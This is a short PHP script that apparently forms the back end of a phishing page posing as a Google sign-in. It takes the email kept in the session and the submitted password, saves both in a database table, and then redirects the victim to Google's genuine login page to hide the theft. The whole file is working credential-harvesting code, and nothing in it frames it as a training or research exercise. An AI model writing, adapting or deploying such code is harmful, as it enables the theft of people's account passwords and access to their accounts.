<?php 
session_start(); // start session to retrive email previously stored in session storage
require ('dbconnect.php'); // connects to database
	$query = $con->prepare("INSERT INTO `user`(`email_or_phone`, `password`) VALUES (?, ?)"); // inserts user's login credentials input
	$query->bind_param('ss', $_SESSION['emailinput'],  $_POST['passwordinput']); //bind the parameters
	$query->execute(); // executes the sql query
    $googleLogin = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com.sg%2F&ec=GAZAmgQ&hl=en&ifkv=AXo7B7WP_eEYZpYASkjJAIY0K-XNh1Ofg3MzZwfKNaYElRtt-Ab_YhY5AiyI8e03g8lOMclkS_4C&passive=true&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S1561198773%3A1690948253203784";
	// stores the google login url in a variable
    header("location: " . $googleLogin); // redirects to the official google login page
?>
